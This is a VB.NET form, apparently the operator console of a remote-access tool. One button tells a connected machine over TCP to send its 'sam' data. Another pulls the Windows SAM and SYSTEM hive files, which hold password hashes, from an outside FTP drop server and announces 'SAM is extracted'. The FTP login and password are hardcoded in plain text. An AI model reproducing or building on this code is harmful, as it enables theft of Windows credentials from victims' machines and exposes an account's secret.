Imports System.Net.Sockets
Imports System.Text
Imports System.IO

Public Class Desktop

    Public TCPClient As New TcpClient
    Public NetStream As NetworkStream
    Dim Thread As System.Threading.Thread
    Dim Thread2 As System.Threading.Thread

    Private Sub Label1_Click(sender As Object, e As EventArgs) Handles Label1.Click, virtualmemory.Click, username.Click, pysicalmemory.Click, osversion.Click, osplatform.Click, os.Click, macaddress.Click, Label9.Click, Label8.Click, Label7.Click, Label6.Click, Label5.Click, Label4.Click, Label3.Click, Label2.Click, ipaddress.Click, hostname.Click

    End Sub

    Private Sub Desktop_Load(sender As Object, e As EventArgs) Handles MyBase.Load

    End Sub

    Private Sub FlatButton1_Click(sender As Object, e As EventArgs) Handles FlatButton1.Click
        FlatButton2.Enabled = True
        If NetStream.CanWrite Then
            Dim sendBytes As Byte() = Encoding.ASCII.GetBytes("sam")
            NetStream.Write(sendBytes, 0, sendBytes.Length)
        End If
    End Sub
    Private Sub FlatButton2_Click(sender As Object, e As EventArgs) Handles FlatButton2.Click
        FlatButton1.Enabled = False
        FlatButton2.Enabled = False
        'start the download thread
        Thread = New System.Threading.Thread(AddressOf download)
        Thread.Start()
    End Sub

    Private Sub download()
        'open the file and write the data to the sam
        Dim fs As FileStream = File.OpenWrite("C:\Users\Romeo VaVa\Desktop\sam")
        'create a ftp request on the specific url
        Dim request As System.Net.FtpWebRequest = DirectCast(System.Net.WebRequest.Create("ftp://ftp.drivehq.com/sam"), System.Net.FtpWebRequest)
        'enable thessl
        request.EnableSsl = True
        'perform download function
        request.Method = System.Net.WebRequestMethods.Ftp.DownloadFile
        'log in to the ftp server
        request.Credentials = New System.Net.NetworkCredential("watchdogscanner@gmail.com", "W@tchD0g_Scanner01172017")
        Try
            'if the response is true
            Dim response As System.Net.FtpWebResponse = request.GetResponse()
            'copy the data from the web request to the SAM file
            request.GetResponse.GetResponseStream.CopyTo(fs)
            'close the file and release all the data
            fs.Close()
            Me.Invoke(Sub()
                          'pop up a message box
                          MessageBox.Show("SAM is extracted")
                      End Sub)
            ' createa thread to download system file
            Thread2 = New System.Threading.Thread(AddressOf download2)
            'start the thread
            Thread2.Start()
        Catch ex As InvalidOperationException
            MessageBox.Show(ex.ToString)
        End Try

    End Sub

    Private Sub download2()
        Dim fs As FileStream = File.OpenWrite("C:\Users\Romeo VaVa\Desktop\system")
        Dim request As System.Net.FtpWebRequest = DirectCast(System.Net.WebRequest.Create("ftp://ftp.drivehq.com/system"), System.Net.FtpWebRequest)
        request.EnableSsl = True
        request.Method = System.Net.WebRequestMethods.Ftp.DownloadFile
        request.Credentials = New System.Net.NetworkCredential("watchdogscanner@gmail.com", "W@tchD0g_Scanner01172017")
        Dim response As System.Net.FtpWebResponse = request.GetResponse()
        request.GetResponse.GetResponseStream.CopyTo(fs)
        fs.Close()
        Me.Invoke(Sub()
                      MessageBox.Show("System is extracted")
                      FlatButton1.Enabled = True
                      FlatButton2.Enabled = True
                  End Sub)
    End Sub


End Class
